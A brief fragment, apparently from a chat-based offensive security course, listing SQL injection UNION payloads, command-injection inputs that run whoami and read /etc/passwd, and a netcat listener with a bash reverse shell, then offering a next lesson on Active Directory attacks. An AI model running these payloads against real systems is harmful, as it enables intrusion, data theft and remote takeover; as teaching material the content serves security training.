...
`' UNION SELECT null, version()--   ' UNION SELECT null, database()--`
...
`127.0.0.1; whoami 127.0.0.1 && cat /etc/passwd`
...
`nc -lvnp 4444 bash -i >& /dev/tcp/<your IP>/4444 0>&1`
...
When you’re ready, we begin **Week 8: Active Directory Part I (Initial Foothold)** — real offensive enterprise tactics. Just give the word.